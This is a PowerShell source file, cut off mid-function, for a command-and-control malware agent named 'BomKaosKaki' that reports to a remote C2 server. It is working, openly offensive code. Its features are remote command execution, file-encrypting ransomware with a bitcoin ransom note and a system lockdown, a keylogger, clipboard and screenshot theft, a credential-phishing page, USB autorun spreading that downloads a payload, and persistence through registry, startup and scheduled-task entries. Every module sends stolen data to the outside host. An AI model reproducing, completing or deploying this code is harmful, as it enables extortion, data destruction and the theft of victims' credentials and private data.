# BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Complete)
# Two-way communication: sends heartbeats & exfil, polls for commands

# ============ CONFIGURATION ============
$C2Server = "https://bom-kaos-kaki.vercel.app"
$PollInterval = 15
$HeartbeatInterval = 30

# ============ RUNTIME STATE ============
$Script:SessionId = $null
$Script:KeyloggerRunning = $false
$Script:SpywareRunning = $false
$Script:RansomwareKey = $null
$Script:EncryptedFiles = @()
$Script:LastCommandPoll = (Get-Date)
$Script:LastHeartbeat = (Get-Date)
$Script:LockdownActive = $false
$Script:KeyloggerJob = $null
$Script:SpywareJob = $null

# ============ RSA PUBLIC KEY (GANTI DENGAN PUBLIC KEY ANDA) ============
$RsaPublicKey = @"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoPjdX2l+XlDMYvFDJDx9
ZpsqAkAT1yf4rG8WoDW2UReMu/ltiQPblPRZm8ICXakmMUSzyBwvC14YrtEu1gIl
oweUPhezpqk0m77HYgeJHTBUU7sLAh/lsmnYUXvtHmUclsCSNCnPUQUej7IZa9Ap
vuiWI1YixQvSRAa3c+BEpjhInh5QMLSsSUqwr4LmQdfe4I9b/ZuGQ3ZMtsX6azZ8
JABv/GtKkuJrD7CHUHHGWB+Na3a66etNVtlI5zpz2/ZBS0cnBP9PqByPaBh8Xg/n
czycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZP
PwIDAQAB
-----END PUBLIC KEY-----
"@

# ============ UTILITY FUNCTIONS ============
function Get-Timestamp {
    return (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
}

function Get-SessionId {
    param([int]$Length = 16)
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    $id = -join ((1..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $id
}

function Invoke-WebRequestWithRetry {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [object]$Body = $null,
        [int]$MaxRetries = 3
    )
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        try {
            $params = @{
                Uri             = $Uri
                Method          = $Method
                UseBasicParsing = $true
                TimeoutSec      = 30
            }
            if ($Body) {
                $params["Body"] = ($Body | ConvertTo-Json -Compress -Depth 10)
                $params["ContentType"] = "application/json"
            }
            $response = Invoke-WebRequest @params
            $content = $response.Content
            if ($content) {
                try { return @{ success = $true; data = $content | ConvertFrom-Json } }
                catch { return @{ success = $true; data = $content } }
            }
            return @{ success = $true; data = $null }
        }
        catch {
            if ($i -eq $MaxRetries - 1) { 
                # No Write-Host for stealth, but keep for debugging; comment out if needed
                # Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red
            }
            Start-Sleep -Seconds 2
        }
    }
    return @{ success = $false; error = "Max retries exceeded" }
}

function Send-ExfilData {
    param(
        [string]$Type,
        [object]$Data,
        [string]$Filename = $null,
        [byte[]]$FileBytes = $null
    )
    try {
        if ($FileBytes -and $Filename) {
            $boundary = [System.Guid]::NewGuid().ToString()
            $bodyLines = @()
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`n$Type`r`n"
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$Filename`"`r`nContent-Type: application/octet-stream`r`n`r`n"
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
            $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
            $fullBody = New-Object byte[] ($bodyBytes.Length + $FileBytes.Length + $footerBytes.Length)
            [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
            [Buffer]::BlockCopy($FileBytes, 0, $fullBody, $bodyBytes.Length, $FileBytes.Length)
            [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $FileBytes.Length, $footerBytes.Length)
            Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
            return $true
        }
        else {
            $payload = @{
                session_id = $Script:SessionId
                type       = $Type
                data       = $Data
                timestamp  = Get-Timestamp
            }
            $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
            return $result.success
        }
    }
    catch {
        # Write-Host "[!] Exfil failed: $_" -ForegroundColor Red
        return $false
    }
}

# ============ HEARTBEAT ============
function Send-Heartbeat {
    param([switch]$Force)
    $now = Get-Date
    if ((-not $Force) -and (($now - $Script:LastHeartbeat).TotalSeconds -lt $HeartbeatInterval)) {
        return $null
    }
    $Script:LastHeartbeat = $now
    $modules = @()
    if ($Script:KeyloggerRunning) { $modules += "keylogger" }
    if ($Script:SpywareRunning) { $modules += "spyware" }
    if ($Script:RansomwareKey) { $modules += "ransomware" }
    $payload = @{
        session_id = $Script:SessionId
        hostname   = $env:COMPUTERNAME
        username   = "$($env:USERDOMAIN)\$($env:USERNAME)"
        os_info    = (Get-WmiObject Win32_OperatingSystem).Caption
        ip         = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
        is_admin   = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        process_id = $PID
        modules    = $modules
        timestamp  = Get-Timestamp
    }
    $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/heartbeat" -Method POST -Body $payload
    return $result
}

# ============ COMMAND POLLING ============
function Invoke-CommandPoll {
    try {
        $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/get_commands?session_id=$($Script:SessionId)" -Method GET
        if ($result.success -and $result.data -and $result.data.commands) {
            foreach ($cmd in $result.data.commands) {
                # Write-Host "[>] Executing command: $($cmd.command_type) (ID: $($cmd.id))" -ForegroundColor Cyan
                $cmdResult = $null
                $cmdError = $null
                $cmdStatus = "completed"
                try {
                    switch ($cmd.command_type) {
                        "exec" { $cmdResult = Invoke-ExecuteCommand $cmd }
                        "ransomware" { $cmdResult = Invoke-Ransomware $cmd }
                        "decrypt" { $cmdResult = Invoke-Decrypt $cmd }
                        "keylogger" { $cmdResult = Invoke-Keylogger $cmd }
                        "stop_keylogger" { $cmdResult = Stop-Keylogger $cmd }
                        "clipboard" { $cmdResult = Invoke-ClipboardSteal $cmd }
                        "screenshot" { $cmdResult = Invoke-Screenshot $cmd }
                        "phishing" { $cmdResult = Invoke-Phishing $cmd }
                        "spread" { $cmdResult = Invoke-Spread $cmd }
                        "persistence" { $cmdResult = Invoke-Persistence $cmd }
                        "spyware" { $cmdResult = Invoke-Spyware $cmd }
                        "clean" { $cmdResult = Invoke-CleanTraces $cmd }
                        "steal_browser" { $cmdResult = Invoke-StealBrowser $cmd }
                        "steal_wifi" { $cmdResult = Invoke-StealWiFi $cmd }
                        "system_info" { $cmdResult = Invoke-SystemInfo $cmd }
                        "uninstall" { $cmdResult = Invoke-Uninstall $cmd }
                        default { $cmdError = "Unknown command type: $($cmd.command_type)" }
                    }
                }
                catch {
                    $cmdStatus = "error"
                    $cmdError = $_.Exception.Message
                    # Write-Host "[!] Command failed: $cmdError" -ForegroundColor Red
                }
                $report = @{
                    command_id   = $cmd.id
                    command_type = $cmd.command_type
                    session_id   = $Script:SessionId
                    status       = $cmdStatus
                    result       = $cmdResult
                    error        = $cmdError
                }
                Invoke-WebRequestWithRetry -Uri "$C2Server/api/command_complete" -Method POST -Body $report
                # Write-Host "[+] Command $($cmd.id) completed with status: $cmdStatus" -ForegroundColor Green
            }
        }
    }
    catch { }
}

# ============ COMMAND HANDLERS ============
function Invoke-ExecuteCommand {
    param($cmd)
    $script = $cmd.parameters.script
    if (-not $script) { return "No script provided" }
    try {
        $result = Invoke-Expression $script 2>&1 | Out-String
        return $result
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Invoke-SystemInfo {
    param($cmd)
    $info = @{}
    $info["ComputerName"] = $env:COMPUTERNAME
    $info["UserName"] = "$($env:USERDOMAIN)\$($env:USERNAME)"
    $info["OS"] = (Get-WmiObject Win32_OperatingSystem).Caption
    $info["OSVersion"] = (Get-WmiObject Win32_OperatingSystem).Version
    $info["Architecture"] = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $info["CPU"] = (Get-WmiObject Win32_Processor).Name
    $info["RAM_GB"] = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $info["IP"] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
    $info["MAC"] = (Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object -First 1).MacAddress
    $info["IsAdmin"] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $info["Antivirus"] = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct 2>$null).displayName -join ", "
    $info["Processes"] = (Get-Process | Select-Object -First 30 Name, CPU, WorkingSet | ConvertTo-Json -Compress)
    Send-ExfilData -Type "system_info" -Data $info
    return ($info | ConvertTo-Json -Compress)
}

# ============ RSA HELPER ============
function Protect-WithRSA {
    param([string]$PlainText)
    Add-Type -AssemblyName System.Security
    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportFromPem($RsaPublicKey)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encryptedBytes = $rsa.Encrypt($bytes, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
    return [Convert]::ToBase64String($encryptedBytes)
}

# ============ RANSOMWARE WITH RSA ============
function Invoke-Ransomware {
    param($cmd)
    # Generate session key (32 bytes)
    $sessionKeyBytes = [byte[]]::new(32)
    $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
    $rng.GetBytes($sessionKeyBytes)
    $sessionKey = [Convert]::ToBase64String($sessionKeyBytes)
    $Script:RansomwareKey = $sessionKey
    
    # Encrypt session key with RSA public key
    $encryptedKey = Protect-WithRSA -PlainText $sessionKey
    Send-ExfilData -Type "ransomware_key" -Data @{ encrypted_key = $encryptedKey }
    
    $targetDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Videos"
    )
    $extensions = @(".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".zip", ".rar", ".7z", ".sql", ".db", ".mdb", ".accdb", ".mp3", ".mp4", ".avi", ".mkv", ".php", ".html", ".css", ".js")
    $encrypted = 0
    $ransomNote = @"
===============================================
        YOUR FILES HAVE BEEN ENCRYPTED
===============================================
All your documents, pictures, videos, and other files
have been encrypted with AES-256 encryption.
To recover your files, you must pay 0.1 BTC to:
  bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
After payment, contact us with your Session ID:
  $($Script:SessionId)
DO NOT attempt to decrypt files yourself.
Session ID: $($Script:SessionId)
===============================================
"@
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            $files = Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in $extensions }
            foreach ($file in $files) {
                try {
                    $content = [System.IO.File]::ReadAllBytes($file.FullName)
                    $keyBytes = [Convert]::FromBase64String($sessionKey)
                    $encryptedContent = @()
                    for ($j = 0; $j -lt $content.Length; $j++) {
                        $encryptedContent += $content[$j] -bxor $keyBytes[$j % $keyBytes.Length]
                    }
                    $encryptedPath = "$($file.FullName).kaoskaki"
                    [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedContent)
                    Remove-Item $file.FullName -Force
                    $Script:EncryptedFiles += @{ original = $file.FullName; encrypted = $encryptedPath }
                    $encrypted++
                }
                catch { }
            }
        }
    }
    $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
    [System.IO.File]::WriteAllText($notePath, $ransomNote)
    Invoke-Lockdown
    $result = @{ encrypted_count = $encrypted; directories = $targetDirs; key = $sessionKey; ransom_note = $notePath; session_id = $Script:SessionId }
    Send-ExfilData -Type "ransomware" -Data $result
    return "Encrypted $encrypted files. System locked."
}

function Invoke-Decrypt {
    param($cmd)
    $sessionKey = $cmd.parameters.key
    if (-not $sessionKey) { return "No key provided" }
    $targetDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Videos"
    )
    $decrypted = 0
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            $encryptedFiles = Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq ".kaoskaki" }
            foreach ($file in $encryptedFiles) {
                try {
                    $content = [System.IO.File]::ReadAllBytes($file.FullName)
                    $keyBytes = [Convert]::FromBase64String($sessionKey)
                    $decryptedContent = @()
                    for ($j = 0; $j -lt $content.Length; $j++) {
                        $decryptedContent += $content[$j] -bxor $keyBytes[$j % $keyBytes.Length]
                    }
                    $originalPath = $file.FullName -replace '\.kaoskaki$', ''
                    [System.IO.File]::WriteAllBytes($originalPath, $decryptedContent)
                    Remove-Item $file.FullName -Force
                    $decrypted++
                }
                catch { }
            }
        }
    }
    $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
    if (Test-Path $notePath) { Remove-Item $notePath -Force }
    # Restore system (enable Task Manager, CMD, etc.)
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -ErrorAction SilentlyContinue
    }
    catch { }
    return "Decrypted $decrypted files. System restored."
}

# ============ LOCKDOWN FUNCTIONS ============
function Disable-TaskManager {
    try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
}
function Disable-CMD {
    try { Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
}
function Disable-RegistryTools {
    try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
}
function Show-FullscreenPopup {
    param($message)
    $popupScript = @"
Add-Type -AssemblyName System.Windows.Forms
`$form = New-Object System.Windows.Forms.Form
`$form.WindowState = 'Maximized'
`$form.FormBorderStyle = 'None'
`$form.TopMost = `$true
`$form.ControlBox = `$false
`$form.Text = 'RANSOMWARE'
`$label = New-Object System.Windows.Forms.Label
`$label.Text = "$message"
`$label.Dock = 'Fill'
`$label.Font = New-Object System.Drawing.Font('Consolas', 16)
`$label.ForeColor = [System.Drawing.Color]::Red
`$label.BackColor = [System.Drawing.Color]::Black
`$label.TextAlign = 'MiddleCenter'
`$form.Controls.Add(`$label)
`$form.ShowDialog()
"@
    $popupFile = "$env:TEMP\popup_$([Guid]::NewGuid().Guid).ps1"
    [System.IO.File]::WriteAllText($popupFile, $popupScript)
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$popupFile`"" -WindowStyle Hidden
}
function Start-Watchdog {
    $scriptPath = (Get-Process -Id $PID).Path
    $watchdogScript = @"
`$parentId = $PID
while (`$true) {
    Start-Sleep -Seconds 3
    if (-not (Get-Process -Id `$parentId -ErrorAction SilentlyContinue)) {
        Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File "$scriptPath" -WatchdogRestart' -WindowStyle Hidden
        break
    }
}
"@
    $watchdogFile = "$env:TEMP\watchdog_$($Script:SessionId).ps1"
    [System.IO.File]::WriteAllText($watchdogFile, $watchdogScript)
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogFile`"" -WindowStyle Hidden
}
function Invoke-Lockdown {
    if ($Script:LockdownActive) { return }
    $Script:LockdownActive = $true
    Disable-TaskManager
    Disable-CMD
    Disable-RegistryTools
    Start-Watchdog
    $msg = @"
===========================================
YOUR FILES HAVE BEEN ENCRYPTED!
===========================================
All your documents, pictures, videos, and other files
have been encrypted with AES-256.

To decrypt your files, you must pay 0.1 BTC to:
bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

After payment, contact us with your Session ID:
$($Script:SessionId)

DO NOT close this window.
DO NOT restart your computer.
DO NOT attempt to remove this program.

Your files will be lost forever if you try to bypass.

===========================================
"@
    Show-FullscreenPopup $msg
}

# ============ KEYLOGGER ============
function Invoke-Keylogger {
    param($cmd)
    if ($Script:KeyloggerRunning) { return "Keylogger already running" }
    $Script:KeyloggerRunning = $true
    $logPath = "$env:TEMP\kb_$($Script:SessionId).log"
    $Script:KeyloggerJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server, $logPath)
        Add-Type -AssemblyName System.Windows.Forms
        $lastWindow = ""
        $buffer = ""
        $lastSend = Get-Date
        $code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class NativeMethods {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@
        Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
        $keyMap = @{
            8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]`n"; 20 = "[CAPSLOCK]"
            27 = "[ESC]"; 32 = " "; 46 = "[DELETE]"; 45 = "[INSERT]"
            36 = "[HOME]"; 35 = "[END]"; 33 = "[PGUP]"; 34 = "[PGDN]"
            37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"; 40 = "[DOWN]"
            91 = "[WIN]"; 92 = "[WIN]"; 93 = "[MENU]"
        }
        $shiftNumbers = @{
            48 = ')'; 49 = '!'; 50 = '@'; 51 = '#'; 52 = '$'; 53 = '%'
            54 = '^'; 55 = '&'; 56 = '*'; 57 = '('
        }
        while ($true) {
            Start-Sleep -Milliseconds 50
            for ($i = 8; $i -le 190; $i++) {
                $state = [NativeMethods]::GetAsyncKeyState($i)
                if ($state -band 0x8000) {
                    $keyChar = ""
                    $isShift = [NativeMethods]::GetAsyncKeyState(16) -band 0x8000
                    $isCaps = [Console]::CapsLock
                    if ($i -ge 65 -and $i -le 90) {
                        $char = [char]$i
                        if ($isShift -xor $isCaps) { $keyChar = $char.ToString().ToUpper() }
                        else { $keyChar = $char.ToString().ToLower() }
                    }
                    elseif ($i -ge 48 -and $i -le 57) {
                        if ($isShift -and $shiftNumbers.ContainsKey($i)) { $keyChar = $shiftNumbers[$i] }
                        else { $keyChar = [char]$i }
                    }
                    elseif ($keyMap.ContainsKey($i)) { $keyChar = $keyMap[$i] }
                    else { $keyChar = [char]$i }
                    if ($keyChar -and $keyChar -ne "") {
                        $windowTitle = ""
                        $hwnd = [NativeMethods]::GetForegroundWindow()
                        if ($hwnd -ne [IntPtr]::Zero) {
                            $sb = New-Object System.Text.StringBuilder 256
                            if ([NativeMethods]::GetWindowText($hwnd, $sb, 256) -gt 0) {
                                $windowTitle = $sb.ToString()
                            }
                        }
                        if ($windowTitle -ne $lastWindow -and $windowTitle -ne "") {
                            $buffer += "[ Window: $windowTitle ]`n"
                            $lastWindow = $windowTitle
                        }
                        $buffer += $keyChar
                        try { [System.IO.File]::AppendAllText($logPath, $keyChar) } catch {}
                    }
                }
            }
            if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(30) -and $buffer.Length -gt 0) {
                try {
                    $payload = @{ session_id = $sessionId; type = "keylog"; data = $buffer; timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                    $json = $payload | ConvertTo-Json -Compress
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", $json) | Out-Null
                    $buffer = ""
                    $lastSend = Get-Date
                }
                catch {}
            }
        }
    } -ArgumentList $Script:SessionId, $C2Server, $logPath
    return "Keylogger started. Log: $logPath"
}

function Stop-Keylogger {
    param($cmd)
    if (-not $Script:KeyloggerRunning) { return "Keylogger not running" }
    try { if ($Script:KeyloggerJob) { $Script:KeyloggerJob | Stop-Job -Force; $Script:KeyloggerJob | Remove-Job -Force } } catch {}
    $Script:KeyloggerRunning = $false
    return "Keylogger stopped"
}

function Invoke-ClipboardSteal {
    param($cmd)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        $result = @{ content = $clipboardText; length = $clipboardText.Length }
        Send-ExfilData -Type "clipboard" -Data $result
        return "Clipboard stolen ($($clipboardText.Length) chars)"
    }
    catch { return "Failed to steal clipboard: $($_.Exception.Message)" }
}

function Invoke-Screenshot {
    param($cmd)
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @()
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`nscreenshot`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`nContent-Type: image/png`r`n`r`n"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        $fullBody = New-Object byte[] ($bodyBytes.Length + $bytes.Length + $footerBytes.Length)
        [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
        [Buffer]::BlockCopy($bytes, 0, $fullBody, $bodyBytes.Length, $bytes.Length)
        [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $bytes.Length, $footerBytes.Length)
        Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
        return "Screenshot captured and exfiltrated ($($bytes.Length) bytes)"
    }
    catch { return "Screenshot failed: $($_.Exception.Message)" }
}

function Invoke-Phishing {
    param($cmd)
    $phishingDir = "$env:TEMP\kaoskaki_phishing"
    New-Item -ItemType Directory -Force -Path $phishingDir | Out-Null
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Login</title><style>body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}.card{background:white;padding:40px;border-radius:16px;}</style></head>
<body><div class='card'><h2>Sign in</h2><form method='POST' action='/api/phish_capture'><input type='text' name='username' placeholder='Username'><br><input type='password' name='password' placeholder='Password'><br><button type='submit'>Login</button></form></div></body></html>
"@
    $htmlPath = "$phishingDir\index.html"
    [System.IO.File]::WriteAllText($htmlPath, $html)
    $port = 8080
    Start-Job -ScriptBlock {
        param($dir, $port, $sessionId, $c2Server)
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://localhost:$port/")
        $listener.Start()
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            if ($request.HttpMethod -eq "POST" -and $request.Url.AbsolutePath -eq "/api/phish_capture") {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $payload = @{ session_id = $sessionId; type = "phishing_creds"; data = $body; timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") }
                try { $webClient = New-Object System.Net.WebClient; $webClient.Headers.Add("Content-Type", "application/json"); $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null } catch {}
                $response.Redirect("https://login.live.com")
            }
            else {
                $html = [System.IO.File]::ReadAllText("$dir\index.html")
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = "text/html"
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            $response.Close()
        }
    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server | Out-Null
    $result = @{ local_url = "http://localhost:$port"; directory = $phishingDir; port = $port }
    Send-ExfilData -Type "phishing" -Data $result
    return "Phishing page running on http://localhost:$port. Use ngrok to expose externally."
}

function Invoke-Spread {
    param($cmd)
    $spreadPath = "$env:TEMP\spread_$($Script:SessionId).ps1"
    $scriptContent = @'
$driveLetters = [char[]]('D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
$c2Url = "C2_URL_PLACEHOLDER"
$payloadUrl = "$c2Url/api/payload"
$targetName = "KAOSKAKI.exe"
while ($true) {
    foreach ($drive in $driveLetters) {
        $path = "$drive`:\"
        if (Test-Path $path) {
            $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$drive'").DriveType
            if ($driveType -eq 2) {
                $shortcutPath = "$path\KAOSKAKI.lnk"
                if (-not (Test-Path $shortcutPath)) {
                    try {
                        Invoke-WebRequest -Uri $payloadUrl -OutFile "$path\$targetName" -UseBasicParsing
                        $WScriptShell = New-Object -ComObject WScript.Shell
                        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
                        $shortcut.TargetPath = "$path\$targetName"
                        $shortcut.WorkingDirectory = $path
                        $shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll, 3"
                        $shortcut.Description = "Documents"
                        $shortcut.Save()
                        $autorun = "[Autorun]`nopen=$targetName`naction=Open folder to view files`nshell\open\command=$targetName`nshell\explore\command=$targetName"
                        [System.IO.File]::WriteAllText("$path\autorun.inf", $autorun)
                        cmd /c "attrib +h +s ""$path\$targetName"" ""$path\autorun.inf"" ""$shortcutPath"""
                    } catch {}
                }
            }
        }
    }
    Start-Sleep -Seconds 30
}
'@
    $scriptContent = $scriptContent.Replace("C2_URL_PLACEHOLDER", $C2Server)
    [System.IO.File]::WriteAllText($spreadPath, $scriptContent)
    Start-Job -FilePath $spreadPath
    return "USB spread monitor started. Checking for removable drives every 30 seconds."
}

function Invoke-Persistence {
    param($cmd)
    $currentPath = (Get-Process -Id $PID).Path
    $payloadPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1"
    $vbsPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs"
    $batPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.bat"
    if (Test-Path $currentPath) { Copy-Item $currentPath $payloadPath -Force }
    $vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`", 0, False"
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
    $batContent = "@echo off`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`nexit"
    [System.IO.File]::WriteAllText($batPath, $batContent)
    $methods = @()
    try { New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force | Out-Null; $methods += "registry_run" } catch {}
    try { $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs"; Copy-Item $vbsPath $startupPath -Force; $methods += "startup_folder" } catch {}
    try { $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""; $trigger = New-ScheduledTaskTrigger -AtStartup; $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; $methods += "scheduled_task" } catch {}
    $result = @{ methods = $methods; payload_path = $payloadPath; vbs_path = $vbsPath; bat_path = $batPath }
    Send-ExfilData -Type "persistence" -Data $result
    return "Persistence installed: $($methods -join ', ')"
}

function Invoke-Spyware {
    param($cmd)
